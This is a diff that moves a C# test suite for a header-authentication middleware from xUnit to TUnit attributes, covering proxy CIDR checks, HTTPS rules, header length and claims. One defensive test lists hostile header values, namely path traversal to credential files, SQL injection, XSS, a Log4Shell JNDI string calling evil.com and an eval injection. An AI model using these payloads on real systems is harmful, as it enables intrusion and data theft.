@@ -16,12 +16,12 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
     private const string TEST_EMAIL = "test@example.com";
     private const string TEST_USER_ID = "test-user-id";
 
-    public HeaderAuthenticationMiddlewareUnitTests(ITestOutputHelper output)
-        : base(output) { }
+    public HeaderAuthenticationMiddlewareUnitTests()
+        : base() { }
 
     #region InvokeAsync - Early Exit Scenarios
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNext_WhenHeaderNotPresent()
     {
         // Arrange
@@ -46,7 +46,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNext_WhenHeaderIsEmpty()
     {
         // Arrange
@@ -72,7 +72,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNext_WhenHeaderIsWhitespace()
     {
         // Arrange
@@ -98,7 +98,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNextAndLogWarning_WhenHeaderPresentButAuthenticationDisabled()
     {
         // Arrange
@@ -142,7 +142,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("Header authentication is disabled"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNext_WhenUserAlreadyAuthenticated()
     {
         // Arrange
@@ -188,15 +188,15 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Trusted Proxy Validation Tests
 
-    [Theory]
-    [InlineData("192.168.1.1", "192.168.1.1", true)]
-    [InlineData("192.168.1.1", "192.168.1.2", false)]
-    [InlineData("192.168.1.1", "192.168.1.0/24", true)]
-    [InlineData("192.168.1.100", "192.168.1.0/24", true)]
-    [InlineData("192.168.2.1", "192.168.1.0/24", false)]
-    [InlineData("10.0.0.1", "10.0.0.0/8", true)]
-    [InlineData("10.255.255.255", "10.0.0.0/8", true)]
-    [InlineData("11.0.0.1", "10.0.0.0/8", false)]
+    [Test]
+    [Arguments("192.168.1.1", "192.168.1.1", true)]
+    [Arguments("192.168.1.1", "192.168.1.2", false)]
+    [Arguments("192.168.1.1", "192.168.1.0/24", true)]
+    [Arguments("192.168.1.100", "192.168.1.0/24", true)]
+    [Arguments("192.168.2.1", "192.168.1.0/24", false)]
+    [Arguments("10.0.0.1", "10.0.0.0/8", true)]
+    [Arguments("10.255.255.255", "10.0.0.0/8", true)]
+    [Arguments("11.0.0.1", "10.0.0.0/8", false)]
     public async Task ShouldValidateTrustedProxy_WhenRequestFromDifferentIPs(
         string requestIp,
         string trustedProxy,
@@ -256,7 +256,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         }
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNextAndLogWarning_WhenRequestFromUntrustedProxy()
     {
         // Arrange
@@ -304,7 +304,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         );
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNext_WhenNoTrustedProxiesConfigured()
     {
         // Arrange
@@ -345,7 +345,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNext_WhenRemoteIpIsNull()
     {
         // Arrange
@@ -377,7 +377,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region HTTPS Requirement Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNextAndLogWarning_WhenHttpsRequiredButRequestNotSecure()
     {
         // Arrange
@@ -424,7 +424,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("Header authentication requires HTTPS"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldProceed_WhenHttpsRequiredAndRequestIsSecure()
     {
         // Arrange
@@ -469,7 +469,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldProceed_WhenHttpsNotRequired()
     {
         // Arrange
@@ -518,7 +518,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Header Length Validation Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNextAndLogWarning_WhenHeaderValueExceedsMaxLength()
     {
         // Arrange
@@ -565,7 +565,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("Header value exceeds maximum length"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldProceed_WhenHeaderValueWithinMaxLength()
     {
         // Arrange
@@ -610,7 +610,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldNotLogWarning_WhenHeaderValueExceedsMaxLengthButLoggingDisabled()
     {
         // Arrange
@@ -662,7 +662,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region User Mapping Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNextAndLogWarning_WhenUserNotFoundByUsername()
     {
         // Arrange
@@ -711,7 +711,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("The wrong user is passed in"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCallNextAndLogWarning_WhenUserNotFoundByEmail()
     {
         // Arrange
@@ -760,7 +760,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("The wrong user is passed in"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldAuthenticateUser_WhenUserFoundByUsername()
     {
         // Arrange
@@ -812,7 +812,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("User authenticated via header"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldAuthenticateUser_WhenUserFoundByEmail()
     {
         // Arrange
@@ -868,14 +868,14 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Security Edge Cases
 
-    [Theory]
-    [InlineData("../../../etc/passwd")]
-    [InlineData("../../../../etc/passwd")]
-    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]
-    [InlineData("admin'; DROP TABLE users; --")]
-    [InlineData("<script>alert('xss')</script>")]
-    [InlineData("${jndi:ldap://evil.com/exploit}")]
-    [InlineData("'; eval('malicious_code'); //")]
+    [Test]
+    [Arguments("../../../etc/passwd")]
+    [Arguments("../../../../etc/passwd")]
+    [Arguments("..\\..\\..\\windows\\system32\\config\\sam")]
+    [Arguments("admin'; DROP TABLE users; --")]
+    [Arguments("<script>alert('xss')</script>")]
+    [Arguments("${jndi:ldap://evil.com/exploit}")]
+    [Arguments("'; eval('malicious_code'); //")]
     public async Task ShouldRejectMaliciousHeaderValues_WhenHeaderContainsSuspiciousContent(string maliciousValue)
     {
         // Arrange
@@ -920,7 +920,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(maliciousValue), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleVeryLongHeaderValue_WhenValueExceedsReasonableLimit()
     {
         // Arrange
@@ -962,7 +962,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleNullHeaderValue_WhenHeaderValueIsNull()
     {
         // Arrange
@@ -994,13 +994,13 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region IPv6 Address Tests
 
-    [Theory]
-    [InlineData("::1", "::1", true)]
-    [InlineData("::1", "127.0.0.1", false)]
-    [InlineData("2001:db8::1", "2001:db8::/32", true)]
-    [InlineData("2001:db8::1", "2001:db8::/64", true)]
-    [InlineData("2001:db8:1::1", "2001:db8::/32", true)]
-    [InlineData("fe80::1", "fe80::/16", true)]
+    [Test]
+    [Arguments("::1", "::1", true)]
+    [Arguments("::1", "127.0.0.1", false)]
+    [Arguments("2001:db8::1", "2001:db8::/32", true)]
+    [Arguments("2001:db8::1", "2001:db8::/64", true)]
+    [Arguments("2001:db8:1::1", "2001:db8::/32", true)]
+    [Arguments("fe80::1", "fe80::/16", true)]
     public async Task ShouldHandleIPv6Addresses_WhenValidIPv6AddressesProvided(
         string requestIp,
         string trustedProxy,
@@ -1064,7 +1064,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Claims Creation Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldCreateCorrectClaims_WhenUserAuthenticatedSuccessfully()
     {
         // Arrange
@@ -1113,7 +1113,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCreateClaimsWithoutEmail_WhenUserHasNoEmail()
     {
         // Arrange
@@ -1167,7 +1167,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCreateClaimsWithEmptyEmail_WhenUserHasEmptyEmail()
     {
         // Arrange
@@ -1221,7 +1221,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldCreateClaimsWithEmptyUsername_WhenUserHasNullUsername()
     {
         // Arrange
@@ -1279,7 +1279,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Additional Security Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleMultipleHeaderValues_WhenHeaderHasMultipleValues()
     {
         // Arrange
@@ -1327,7 +1327,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync("malicious_user"), Times.Never);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldTrimWhitespaceFromHeaderValue_WhenHeaderValueHasWhitespace()
     {
         // Arrange
@@ -1374,7 +1374,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldNotLogSensitiveInformation_WhenLoggingIsDisabled()
     {
         // Arrange
@@ -1423,11 +1423,11 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldNotContain(e => e.MessageTemplate.Text.Contains("The wrong user is passed in"));
     }
 
-    [Theory]
-    [InlineData("0.0.0.0/0", "8.8.8.8", true)] // Global range
-    [InlineData("0.0.0.0/0", "192.168.1.1", true)] // Global range
-    [InlineData("0.0.0.0/0", "10.0.0.1", true)] // Global range
-    [InlineData("0.0.0.0/0", "::1", false)] // Global range with IPv6 - IPv6 addresses don't match IPv4 CIDR ranges
+    [Test]
+    [Arguments("0.0.0.0/0", "8.8.8.8", true)] // Global range
+    [Arguments("0.0.0.0/0", "192.168.1.1", true)] // Global range
+    [Arguments("0.0.0.0/0", "10.0.0.1", true)] // Global range
+    [Arguments("0.0.0.0/0", "::1", false)] // Global range with IPv6 - IPv6 addresses don't match IPv4 CIDR ranges
     public async Task ShouldHandleGlobalCidrRange_WhenGlobalRangeIsConfigured(
         string cidrRange,
         string requestIp,
@@ -1487,7 +1487,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         }
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleIPv4MappedIPv6Address_WhenAddressIsMapped()
     {
         // Arrange
@@ -1533,11 +1533,11 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Theory]
-    [InlineData("192.168.1.0/32", "192.168.1.0", true)] // Single host
-    [InlineData("192.168.1.0/32", "192.168.1.1", false)] // Different host
-    [InlineData("192.168.1.1/32", "192.168.1.1", true)] // Exact match
-    [InlineData("192.168.1.1/32", "192.168.1.2", false)] // Different host
+    [Test]
+    [Arguments("192.168.1.0/32", "192.168.1.0", true)] // Single host
+    [Arguments("192.168.1.0/32", "192.168.1.1", false)] // Different host
+    [Arguments("192.168.1.1/32", "192.168.1.1", true)] // Exact match
+    [Arguments("192.168.1.1/32", "192.168.1.2", false)] // Different host
     public async Task ShouldHandleSingleHostCidr_WhenCidrIs32(string cidrRange, string requestIp, bool shouldBeTrusted)
     {
         // Arrange
@@ -1593,7 +1593,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         }
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleInvalidCidrRange_WhenCidrIsMalformed()
     {
         // Arrange
@@ -1634,7 +1634,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleEmptyCidrRange_WhenCidrIsEmpty()
     {
         // Arrange
@@ -1675,7 +1675,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleNullCidrRange_WhenCidrIsNull()
     {
         // Arrange
@@ -1720,7 +1720,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Performance and Stress Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleLargeNumberOfTrustedProxies_WhenManyProxiesConfigured()
     {
         // Arrange
@@ -1773,7 +1773,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleConcurrentRequests_WhenMultipleRequestsProcessed()
     {
         // Arrange
@@ -1829,7 +1829,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
                         results.Add(nextCalled);
                     }
                 },
-                TestContext.Current.CancellationToken
+                TUnit.Core.TestContext.Current?.CancellationToken ?? CancellationToken.None
             );
 
             tasks.Add(task);
@@ -1847,7 +1847,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Error Handling Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleUserServiceException_WhenUserServiceThrows()
     {
         // Arrange
@@ -1879,7 +1879,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         await Should.ThrowAsync<InvalidOperationException>(async () => await Sut.InvokeAsync(context));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldHandleRoleServiceException_WhenRoleServiceThrows()
     {
         // Arrange
@@ -1918,11 +1918,11 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Boundary Value Tests
 
-    [Theory]
-    [InlineData(1, true)] // Minimum valid length
-    [InlineData(256, true)] // Maximum default length
-    [InlineData(257, false)] // Exceeds default maximum
-    [InlineData(0, false)] // Zero length
+    [Test]
+    [Arguments(1, true)] // Minimum valid length
+    [Arguments(256, true)] // Maximum default length
+    [Arguments(257, false)] // Exceeds default maximum
+    [Arguments(0, false)] // Zero length
     public async Task ShouldValidateHeaderLengthBoundaries_WhenHeaderLengthIsAtBoundaries(
         int headerLength,
         bool shouldPass
@@ -1973,12 +1973,12 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         next.Verify(x => x(context), Times.Once);
     }
 
-    [Theory]
-    [InlineData("192.168.1.0/0", "192.168.1.1", true)] // Minimum CIDR
-    [InlineData("192.168.1.0/32", "192.168.1.0", true)] // Maximum CIDR for IPv4 (exact match)
-    [InlineData("192.168.1.0/33", "192.168.1.1", false)] // Invalid CIDR for IPv4
-    [InlineData("2001:db8::/128", "2001:db8::", true)] // Maximum CIDR for IPv6 (exact match)
-    [InlineData("2001:db8::/129", "2001:db8::1", false)] // Invalid CIDR for IPv6
+    [Test]
+    [Arguments("192.168.1.0/0", "192.168.1.1", true)] // Minimum CIDR
+    [Arguments("192.168.1.0/32", "192.168.1.0", true)] // Maximum CIDR for IPv4 (exact match)
+    [Arguments("192.168.1.0/33", "192.168.1.1", false)] // Invalid CIDR for IPv4
+    [Arguments("2001:db8::/128", "2001:db8::", true)] // Maximum CIDR for IPv6 (exact match)
+    [Arguments("2001:db8::/129", "2001:db8::1", false)] // Invalid CIDR for IPv6
     public async Task ShouldValidateCidrBoundaries_WhenCidrIsAtBoundaries(
         string cidrRange,
         string testIp,
@@ -2042,7 +2042,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Integration-Style Tests
 
-    [Fact]
+    [Test]
     public async Task ShouldCompleteFullAuthenticationFlow_WhenAllConditionsMet()
     {
         // Arrange
@@ -2100,7 +2100,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("User authenticated via header"));
     }
 
-    [Fact]
+    [Test]
     public async Task ShouldRejectRequest_WhenAllSecurityChecksFail()
     {
         // Arrange
